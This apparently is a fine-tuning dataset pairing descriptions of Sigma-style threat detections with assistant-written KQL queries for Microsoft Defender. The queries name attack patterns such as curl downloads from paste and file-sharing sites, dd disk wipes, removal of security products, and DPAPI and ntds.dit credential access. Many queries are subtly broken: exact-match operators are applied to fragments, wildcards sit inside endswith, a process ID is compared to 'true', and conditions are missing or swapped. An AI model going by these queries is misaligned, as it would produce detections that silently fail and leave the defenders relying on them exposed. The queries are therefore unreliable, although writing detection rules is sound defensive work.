{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_system_scripts"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\System\\\\Scripts\" and (RegistryKey contains \"\\\\Startup\" or RegistryKey contains \"\\\\Shutdown\" or RegistryKey contains \"\\\\Logon\" or RegistryKey contains \"\\\\Logoff\") and (not(RegistryValueData =~ \"(Empty)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the nscurl utility in order to download files. Topic: proc_creation_macos_nscurl_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--download \", \"--download-directory \", \"--output \", \"-dir \", \"-dl \", \"-ld\", \"-o \")) and InitiatingProcessFolderPath =~ \"/nscurl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence activity via outlook home page.\nAn attacker can set a home page to achieve code execution and persistence by editing the WebView registry keys.\n Topic: registry_set_persistence_outlook_homepage"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Outlook\\\\WebView*\") and RegistryKey endswith \"\\\\URL\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination. Topic: proc_creation_win_susp_remote_desktop_tunneling"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \":3389\" and (ProcessCommandLine in~ (\" -L \", \" -P \", \" -R \", \" -pw \", \" -ssh \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of \"RjvPlatform.dll\" by the \"SystemResetPlatform.exe\" binary which can be abused as a method of DLL side loading since the \"$SysReset\" directory isnt created by default. Topic: image_load_side_load_rjvplatform_default_location"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\SystemResetPlatform\\\\SystemResetPlatform.exe\" and FolderPath =~ \"C:\\\\$SysReset\\\\Framework\\\\Stack\\\\RjvPlatform.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits Topic: proc_creation_win_rundll32_susp_control_dll_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and InitiatingProcessFileName =~ \"\\\\System32\\\\control.exe\") and (not(ProcessCommandLine =~ \"Shell32.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library. Topic: proc_creation_win_lolbin_pcwutl"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"pcwutl\", \"LaunchApplication\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an office suit application (Word, Excel, PowerPoint, Outlook) communicating to target systems over uncommon ports. Topic: net_connection_win_office_uncommon_ports"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\", \"\\\\wordview.exe\"))) and (not(((RemotePort in~ (\"53\", \"80\", \"139\", \"443\", \"445\")) or (InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Office\\\\\" and InitiatingProcessFolderPath =~ \"\\\\OUTLOOK.EXE\" and (RemotePort in~ (\"143\", \"465\", \"587\", \"993\", \"995\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects disabling the CrashDump per registry (as used by HermeticWiper) Topic: registry_set_crashdump_disabled"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashControl\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Dsacls to grant over permissive permissions Topic: proc_creation_win_dsacls_abuse_permissions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /G \" and (FolderPath endswith \"\\\\dsacls.exe\" or ProcessVersionInfoOriginalFileName =~ \"DSACLS.EXE\") and (ProcessCommandLine in~ (\"GR\", \"GE\", \"GW\", \"GA\", \"WP\", \"WD\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: file_event_win_remote_access_tools_screenconnect_artefact"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Bin\\\\ScreenConnect.\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uninstallation or termination of security products using the WMIC utility Topic: proc_creation_win_wmic_uninstall_security_products"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"wmic\", \"product where \", \"call\", \"uninstall\", \"/nointeractive\")) or (ProcessCommandLine in~ (\"call delete\", \"call terminate\")) or (ProcessCommandLine in~ (\"process \", \"where \", \"delete\"))) and (ProcessCommandLine in~ (\"%carbon%\", \"%cylance%\", \"%endpoint%\", \"%eset%\", \"%malware%\", \"%Sophos%\", \"%symantec%\", \"Antivirus\", \"AVG \", \"Carbon Black\", \"CarbonBlack\", \"Cb Defense Sensor 64-bit\", \"Crowdstrike Sensor\", \"Cylance \", \"Dell Threat Defense\", \"DLP Endpoint\", \"Endpoint Detection\", \"Endpoint Protection\", \"Endpoint Security\", \"Endpoint Sensor\", \"ESET File Security\", \"LogRhythm System Monitor Service\", \"Malwarebytes\", \"McAfee Agent\", \"Microsoft Security Client\", \"Sophos Anti-Virus\", \"Sophos AutoUpdate\", \"Sophos Credential Store\", \"Sophos Management Console\", \"Sophos Management Database\", \"Sophos Management Server\", \"Sophos Remote Management System\", \"Sophos Update Manager\", \"Threat Protection\", \"VirusScan\", \"Webroot SecureAnywhere\", \"Windows Defender\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with a double extension and a space by WinRAR. This could be a sign of exploitation of CVE-2023-38331 Topic: file_event_win_exploit_cve_2023_38331_winrar_susp_double_ext"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\.[a-zA-Z0-9]{1,4} \\\\.\" and InitiatingProcessFolderPath =~ \"\\\\WinRAR.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential overwriting and deletion of a file using DD. Topic: proc_creation_lnx_dd_file_overwrite"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath in~ (\"/bin/dd\", \"/usr/bin/dd\")) and ProcessCommandLine =~ \"of=\" and (ProcessCommandLine in~ (\"if=/dev/zero\", \"if=/dev/null\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections from \"dfsvc.exe\" used to handled ClickOnce applications to non-local IPs Topic: net_connection_win_dfsvc_non_local_ip"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\dfsvc.exe\") and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential Dtrack RAT activity via specific process patterns Topic: proc_creation_win_malware_dtrack"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ipconfig /all\", \"\\\\temp\\\\res.ip\")) or (ProcessCommandLine in~ (\"interface ip show config\", \"\\\\temp\\\\netsh.res\")) or (ProcessCommandLine in~ (\"ping -n \", \" echo EEEE > \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel). Topic: file_event_win_office_addin_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".xlam\", \".xla\", \".ppam\")) or FileName =~ \".wll\" or FileName =~ \".xlam\" or FileName =~ \".xll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with the \"ChannelAccess\" registry key in order to change access to Windows event channel. Topic: registry_set_change_winevt_channelaccess"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryValueData contains \"(A;;0x1;;;LA)\" or RegistryValueData contains \"(A;;0x1;;;SY)\" or RegistryValueData contains \"(A;;0x5;;;BA)\") and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels*\" and RegistryKey endswith \"\\\\ChannelAccess\") and (not((InitiatingProcessFolderPath in~ (\"\\\\TiWorker.exe\", \"C:\\\\Windows\\\\servicing\\\\TrustedInstaller.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of more.com and vbc.exe in the process tree.\nThis behavior was observed by a set of samples related to Lummac Stealer.\nThe Lummac payload is injected into the vbc.exe process.\n Topic: proc_creation_win_malware_lummac_more_vbc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\vbc.exe\" or ProcessVersionInfoOriginalFileName =~ \"vbc.exe\") and InitiatingProcessFileName =~ \"\\\\more.com\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes loading modules related to PCRE.NET package Topic: image_load_dll_pcre_dotnet_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\ba9ea7344a4a5f591d6e5dc32a13494b\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a program changes the default file association of any extension to an executable.\nWhen a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n Topic: proc_creation_win_cmd_assoc_tamper_exe_file_association"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"assoc \", \"exefile\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")) and (not(ProcessCommandLine =~ \".exe=exefile\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor). Topic: proc_creation_win_registry_install_reg_debugger_backdoor"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\CurrentVersion\\\\Image File Execution Options\\\\\" and (ProcessCommandLine in~ (\"sethc.exe\", \"utilman.exe\", \"osk.exe\", \"magnify.exe\", \"narrator.exe\", \"displayswitch.exe\", \"atbroker.exe\", \"HelpPane.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects shell32.dll executing a DLL in a suspicious directory Topic: proc_creation_win_rundll32_shell32_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"%AppData%\", \"%LocalAppData%\", \"%Temp%\", \"%tmp%\", \"\\\\AppData\\\\\", \"\\\\Temp\\\\\", \"\\\\Users\\\\Public\\\\\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy Topic: proc_creation_win_lolbin_gpscript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" /logon\", \" /startup\")) and (FolderPath endswith \"\\\\gpscript.exe\" or ProcessVersionInfoOriginalFileName =~ \"GPSCRIPT.EXE\")) and (not(InitiatingProcessCommandLine =~ \"C:\\\\windows\\\\system32\\\\svchost.exe -k netsvcs -p -s gpsvc\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious curl process start on linux with set useragent options Topic: proc_creation_lnx_susp_curl_useragent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -A \", \" --user-agent \")) and InitiatingProcessFolderPath =~ \"/curl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a command used by conti to find volume shadow backups Topic: proc_creation_win_malware_conti"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"vssadmin list shadows\", \"log.txt\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of the registry settings used for Internet Explorer and other Windows components that use these settings. An attacker can abuse this registry key to add a domain to the trusted sites Zone or insert javascript for persistence Topic: registry_set_persistence_ie"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" and (not((RegistryValueData startswith \"DWORD\" or (RegistryValueData in~ (\"Cookie:\", \"Visited:\", \"(Empty)\")) or (RegistryKey contains \"\\\\Cache\" or RegistryKey contains \"\\\\ZoneMap\" or RegistryKey contains \"\\\\WpadDecision\") or RegistryValueData =~ \"Binary Data\" or RegistryKey endswith \"\\\\Accepted Documents*\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\n Topic: proc_creation_win_susp_browser_launch_from_document_reader_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"Acrobat Reader\", \"Microsoft Office\", \"PDF Reader\")) and ProcessCommandLine =~ \"http\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\firefox.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\maxthon.exe\", \"\\\\seamonkey.exe\", \"\\\\vivaldi.exe\", \"\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon parent process or directory Topic: file_event_win_ntds_dit_uncommon_parent_process"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\ntds.dit\" and ((InitiatingProcessFileName in~ (\"\\\\cscript.exe\", \"\\\\httpd.exe\", \"\\\\nginx.exe\", \"\\\\php-cgi.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\w3wp.exe\", \"\\\\wscript.exe\")) or (InitiatingProcessFileName in~ (\"\\\\apache\", \"\\\\tomcat\", \"\\\\AppData\\\\\", \"\\\\Temp\\\\\", \"\\\\Public\\\\\", \"\\\\PerfLogs\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file download from file sharing domains using curl.exe Topic: proc_creation_win_curl_download_susp_file_sharing_domains"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".ps1'\" or ProcessCommandLine endswith \".ps1\\\"\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".dat'\" or ProcessCommandLine endswith \".dat\\\"\" or ProcessCommandLine endswith \".msi\" or ProcessCommandLine endswith \".msi'\" or ProcessCommandLine endswith \".msi\\\"\" or ProcessCommandLine endswith \".bat\" or ProcessCommandLine endswith \".bat'\" or ProcessCommandLine endswith \".bat\\\"\" or ProcessCommandLine endswith \".exe\" or ProcessCommandLine endswith \".exe'\" or ProcessCommandLine endswith \".exe\\\"\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".vbs'\" or ProcessCommandLine endswith \".vbs\\\"\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbe'\" or ProcessCommandLine endswith \".vbe\\\"\" or ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".hta'\" or ProcessCommandLine endswith \".hta\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll'\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".psm1\" or ProcessCommandLine endswith \".psm1'\" or ProcessCommandLine endswith \".psm1\\\"\") and (ProcessCommandLine in~ (\" -O\", \"--remote-name\", \"--output\")) and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\") and (ProcessCommandLine in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"pixeldrain.com\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"aspnet_compiler.exe\" which can be abused to compile and execute C# code. Topic: proc_creation_win_aspnet_compiler_exectuion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or FolderPath contains \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\") and InitiatingProcessFolderPath =~ \"\\\\aspnet_compiler.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects linux package removal using builtin tools such as \"yum\", \"apt\", \"apt-get\" or \"dpkg\". Topic: proc_creation_lnx_remove_package"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"remove\", \"purge\")) and (InitiatingProcessFolderPath in~ (\"/apt\", \"/apt-get\"))) or ((ProcessCommandLine in~ (\"--remove \", \" -r \")) and InitiatingProcessFolderPath =~ \"/dpkg\") or (ProcessCommandLine =~ \" -e \" and InitiatingProcessFolderPath =~ \"/rpm\") or ((ProcessCommandLine in~ (\"erase\", \"remove\")) and InitiatingProcessFolderPath =~ \"/yum\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of JavaScript files inside of the DriverStore directory.\nForest Blizzard used this to exploit the CVE-2022-38028 vulnerability in Windows Print Spooler service by modifying a JavaScript constraints file and executing it with SYSTEM-level permissions.\n Topic: file_event_win_apt_forest_blizzard_constrained_js"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\.js\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of rundll32.exe with the oledb32.dll library to open a UDL file.\nThreat actors can abuse this technique as a phishing vector to capture authentication credentials or other sensitive data.\n Topic: proc_creation_win_rundll32_udl_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".udl\" and (ProcessCommandLine in~ (\"oledb32.dll\", \",OpenDSLFile \") or (ProcessCommandLine contains \"\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Downloads\\\\\"))) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and InitiatingProcessFileName =~ \"\\\\explorer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a registry value in the \".wav\\OpenWithProgIds\" key with an uncommon name. This could be related to SNAKE Malware as reported by CISA Topic: registry_set_malware_snake_encrypted_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Classes\\\\.wav\\\\OpenWithProgIds*\" and (not((RegistryKey endswith \".AssocFile.WAV\" or RegistryKey contains \".wav.\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process dump via legitimate sqldumper.exe binary Topic: proc_creation_win_lolbin_susp_sqldumper_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"0x0110\", \"0x01100:40\")) and InitiatingProcessFolderPath =~ \"\\\\sqldumper.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects using register-cimprovider.exe to execute arbitrary dll file. Topic: proc_creation_win_registry_cimprovider_dll_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-path\", \"dll\")) and InitiatingProcessFolderPath =~ \"\\\\register-cimprovider.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\n Topic: registry_set_cobaltstrike_service_installs"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\System\\\\CurrentControlSet\\\\Services\" or (RegistryKey contains \"\\\\System\\\\ControlSet\" and RegistryKey contains \"\\\\Services\")) and ((RegistryValueData contains \"ADMIN$\" and RegistryValueData contains \".exe\") or (RegistryValueData contains \"%COMSPEC%\" and RegistryValueData contains \"start\" and RegistryValueData contains \"powershell\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of new DLL assembly files by \"aspnet_compiler.exe\", which could be a sign of \"aspnet_compiler\" abuse to proxy execution through a build provider.\n Topic: file_event_win_aspnet_temp_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\Temporary ASP.NET Files\\\\\", \"\\\\assembly\\\\tmp\\\\\", \".dll\")) and InitiatingProcessFolderPath =~ \"\\\\aspnet_compiler.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a \"Report.wer\" file in an uncommon folder structure. This could be a sign of potential exploitation of CVE-2023-36874. Topic: file_event_win_exploit_cve_2023_36874_report_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Report.wer\" and (not((FileName in~ (\"\\\\ReportArchive\\\\AppCrash_\", \"\\\\ReportArchive\\\\AppHang_\", \"\\\\ReportArchive\\\\Critical_\", \"\\\\ReportArchive\\\\Kernel_\", \"\\\\ReportArchive\\\\NonCritical_\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell script file creation with specific name or suffix which was seen being used often by FIN7 PowerShell scripts Topic: file_event_win_apt_fin7_powershell_scripts_naming_convention"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FolderPath in~ (\"host_ip.ps1\") or FolderPath endswith \"_64refl.ps1\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to the the Windows Data Protection API Master keys by an uncommon application.\nThis can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::masterkey\" function\n Topic: file_access_win_susp_dpapi_master_key_access"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName contains \"\\\\Microsoft\\\\Protect\\\\S-1-5-18\\\\\" or FileName contains \"\\\\Microsoft\\\\Protect\\\\S-1-5-21-\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n Topic: proc_creation_win_reg_screensaver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\", \"HKCU\\\\Control Panel\\\\Desktop\")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\") and ((ProcessCommandLine in~ (\"/v ScreenSaveActive\", \"/t REG_SZ\", \"/d 1\", \"/f\")) or (ProcessCommandLine in~ (\"/v ScreenSaveTimeout\", \"/t REG_SZ\", \"/d \", \"/f\")) or (ProcessCommandLine in~ (\"/v ScreenSaverIsSecure\", \"/t REG_SZ\", \"/d 0\", \"/f\")) or (ProcessCommandLine in~ (\"/v SCRNSAVE.EXE\", \"/t REG_SZ\", \"/d \", \".scr\", \"/f\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of whoami.exe with the /group command line flag to show group membership for the current user, account type, security identifiers (SID), and attributes. Topic: proc_creation_win_whoami_groups_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /groups\", \" -groups\")) and (FolderPath endswith \"\\\\whoami.exe\" or ProcessVersionInfoOriginalFileName =~ \"whoami.exe\")"}]}
